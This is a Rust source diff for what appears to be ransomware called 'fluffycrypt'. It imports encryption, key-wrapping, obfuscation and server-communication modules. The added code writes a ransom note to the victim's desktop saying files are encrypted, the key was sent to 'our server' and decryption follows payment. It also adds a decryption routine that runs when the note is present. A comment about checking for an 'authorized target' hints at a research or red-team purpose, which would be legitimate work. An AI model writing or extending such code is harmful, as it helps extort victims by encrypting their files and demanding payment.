@@ -3,6 +3,7 @@ use encryptor::wrap_key;
 use filesystem::recurse_directory_with_channel;
 use obfuscation::get_ip;
 use safeguard::should_disable_crypto;
+use std::fs::write;
 use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
@@ -14,6 +15,7 @@ use tracing_subscriber::fmt::Subscriber;
 use zeroize::Zeroize;
 
 mod comms;
+mod decryption;
 mod encryptor;
 mod filesystem;
 mod obfuscation;
@@ -50,6 +52,16 @@ async fn main() {
     let subscriber = builder.finish();
     tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
     event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
+
+    let mut path = if dirs::desktop_dir().is_none() {
+        dirs::home_dir().unwrap()
+    } else {
+        dirs::desktop_dir().unwrap()
+    };
+    path.push("fluffycrypt-notice-of-cryptographic-action.txt");
+    if path.exists() {
+        decryption::decryption_script(path).await;
+    }
 
     // preflight checks (make sure system is an authorized target)
     let disable_cryptography = should_disable_crypto();
@@ -172,6 +184,17 @@ async fn main() {
                     continue;
                 }
                 Message::Accepted(_) => {
+                    let mut directory = if dirs::desktop_dir().is_none() {
+                        dirs::home_dir().unwrap()
+                    } else {
+                        dirs::desktop_dir().unwrap()
+                    };
+                    directory.push("fluffycrypt-notice-of-cryptographic-action.txt");
+                    let content = format!("Hi, your files are now encrypted and a key was successfully transmitted to our server. 
+                        We have generated a unique identifier for you, it's: {}\nOnce we've recieved payment, you can run the executable one \
+                        more time. Our server will \ntransmit your key back and this client will immediately decrypt your files without further \
+                        action on your side.\nWe look forward to hearing from you.", ucid);
+                    let _ = write(directory, &content);
                     // registration accepted, no need to retry
                     event!(
                         Level::INFO,
